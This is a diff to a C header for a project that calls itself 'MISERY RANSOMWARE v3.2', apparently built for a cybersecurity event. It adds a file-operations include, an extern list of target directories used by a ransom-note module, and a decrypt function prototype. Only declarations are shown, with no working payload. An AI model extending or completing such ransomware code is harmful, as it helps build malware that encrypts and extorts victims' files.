@@ -1,14 +1,14 @@
 #ifndef MISERY_CONFIG_H
 #define MISERY_CONFIG_H
 
+#include "fileops.h" 
 #include <windows.h>
 #include <stdbool.h>
 #include <time.h>
 
-/* ============================================================
- * MISERY RANSOMWARE: v3.2 - Professional Orchestration
- * Cybersecurity Event Variant
- * ============================================================ */
+/*
+ * MISERY RANSOMWARE Gui header
+ */
 
 /* Configuration Magic */
 #define MISERY_VERSION              "3.2"
@@ -52,6 +52,10 @@ typedef struct {
 
 extern MISERY_GLOBAL_CTX g_misery_ctx;
 
+/* Target directories — defined in misery.c, used by ransomnote.c */
+
+extern const char *g_target_dirs[];
+
 /* Logging Levels */
 typedef enum {
     MISERY_LOG_INFO,
@@ -64,5 +68,8 @@ bool MiseryPhaseTransition(MISERY_PHASE newPhase, bool success);
 void MiseryReportStats(void);
 bool MiseryInitContext(void);
 void MiseryCleanupContext(void);
+
+/* for misery.c */
+bool MiseryRunDecrypt(const char *key, FILEOPS_STATS *outStats);
 
 #endif // MISERY_CONFIG_H
